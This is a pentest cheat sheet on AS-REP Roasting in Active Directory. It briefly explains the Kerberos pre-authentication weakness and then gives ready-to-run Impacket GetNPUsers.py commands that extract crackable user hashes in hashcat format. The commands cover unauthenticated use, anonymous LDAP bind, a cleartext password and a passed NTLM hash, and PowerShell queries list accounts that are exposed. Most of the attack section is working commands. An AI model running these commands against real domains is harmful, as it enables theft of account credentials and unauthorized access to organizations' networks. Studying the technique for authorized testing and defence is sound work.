# AS-REP Roasting

> Extract TGTs from user accounts without Kerberos pre-authentication, and crack their encrypted content offline.

## 🧠 Theory

AS-REP Roasting targets **Kerberos user accounts** that have the `DONT_REQ_PREAUTH` flag set.

- Normally, Kerberos requires users to prove their identity **before** receiving a TGT (pre-authentication).
- If the flag is disabled, anyone can **request an encrypted AS-REP** (TGT) without proving anything.
- This AS-REP contains data **encrypted with the user's NT hash**, so it can be cracked offline like a password hash.

## Exploit

### Get hashes from user wordlist (unauthenticated)

```bash
GetNPUsers.py domain.lan/ -usersfile users.txt -dc-ip 192.168.1.10 \
  -no-pass -request -format hashcat -outputfile asrep_hashes.txt
```

### 🔒 2. LDAP anonymous bind

```bash
GetNPUsers.py -request -format hashcat -outputfile asrep_hashes.txt \
  -dc-ip $DC_IP 'domain.local/'
```

### 🔑 3. With valid credentials

```bash
# Authenticated with cleartext credentials
GetNPUsers.py -request -format hashcat -outputfile asrep_hashes.txt \
  -dc-ip $DC_IP 'domain.local/user:password'

# Authenticated with NTLM hash
GetNPUsers.py -request -format hashcat -outputfile asrep_hashes.txt \
  -hashes :NTLMHASH -dc-ip $DC_IP 'domain.local/user'
```

```bash
# users list dynamically queried with a LDAP authenticated bind (NT hash)
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

### Windows

```powershell
# Listing account vuln to AS-REP Roasting via powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name,SamAccountName

# Using decimal flag value 4194304 in UserAccountControl
Get-ADUser -Filter {UserAccountControl -band 4194304} -Properties SamAccountName | Select-Object SamAccountName
```

## Resources

- [thehacker.recipes ASRep](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)
- [Hacktricks ASRep](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html)
